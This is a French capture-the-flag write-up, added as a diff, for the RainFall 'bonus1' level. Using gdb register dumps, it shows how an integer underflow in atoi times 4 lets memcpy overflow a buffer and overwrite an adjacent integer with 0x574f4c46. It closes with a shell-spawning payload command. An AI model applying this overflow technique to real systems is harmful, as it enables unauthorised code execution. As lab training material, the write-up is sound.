@@ -1,0 +1,79 @@
+- Apres analyse du code asm, on remarque que le 1er argument du prog
+passe dans un atoi et le 2eme arguement est ensuite copier avec un memcpy.
+- Si le resultat de l'atoi du 1er argument est superieur a 9, le programe se termine
+- Le resultat de l'atoi est multiplier par 4 quand il est l'argument de memcpy
+- Pour lancer un shell, une comparaison entre le retour de atoi est effectuer
+avec 0x574f4c46
+- On remarque que le buffer ou est effectuer le memcpy se trouver adjacent en
+memoire du retour de l'atoi
+- Il va falloir overflow le buffer afin de copier le nombre adequate dans l'int
+- Pour se faire, on va provoquer un underflow de la valeur passer en 1er arguement
+qu moment de sa multiplication par 4
+
+1) On regarde la comportement du programe sous gdb avec un nombre negatif tres grand
+
+Dans ecx est stocker la valeur de l'atoi * 4
+
+break *0x8048473
+r -3000000000 `python -c 'print "A" * 128'`
+i r
+
+eax            0xbffff644       -1073744316
+ecx            0x0      0
+edx            0xbffff866       -1073743770
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff630       0xbffff630
+ebp            0xbffff678       0xbffff678
+esi            0x0      0
+
+On voit que ecx == 0
+
+2) On test la meme chose avec une valeur petite
+
+break *0x8048473
+r -100 `python -c 'print "A" * 128'`
+i r
+
+eax            0xbffff6b4       -1073744204
+ecx            0xfffffe70       -400
+edx            0xbffff8c6       -1073743674
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff6a0       0xbffff6a0
+ebp            0xbffff6e8       0xbffff6e8
+esi            0x0      0
+edi            0x0      0
+
+On voit aue la multiplication par 4 ets effectuer correctement
+
+3) On test la meme chose avec un nombre pas trop grand
+
+break *0x8048473
+r -2000000000 `python -c 'print "A" * 128'`
+i r
+
+eax            0xbffff6b4       -1073744204
+ecx            0x2329b000       589934592
+edx            0xbffff8c6       -1073743674
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff6a0       0xbffff6a0
+ebp            0xbffff6e8       0xbffff6e8
+esi            0x0      0
+edi            0x0      0
+
+On voit que ca a underflow
+
+4) On va rechercher ensuite la valeur bascule entre ecx = 0 et ecx = un underflow minime
+
+Pour se faire on remarque le programme ne segfault pas si le nombre negatif
+est trop grand et qu'il segfault s'il est trop petit
+
+bonus1@RainFall:~$ ./bonus1 -2147483633 `python -c 'print "A" * 128'`
+Segmentation fault (core dumped)
+bonus1@RainFall:~$ ./bonus1 -2147483634 `python -c 'print "A" * 128'`
+bonus1@RainFall:~$
+
+5) On test sous gdb et voit aue cette valeur donne ecx = 60
+
+5) On met un playload de 40 "A" et 0x574f4c46 juste apres afin de lancer le shell
+
+./bonus1 -2147483633 `python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"'`
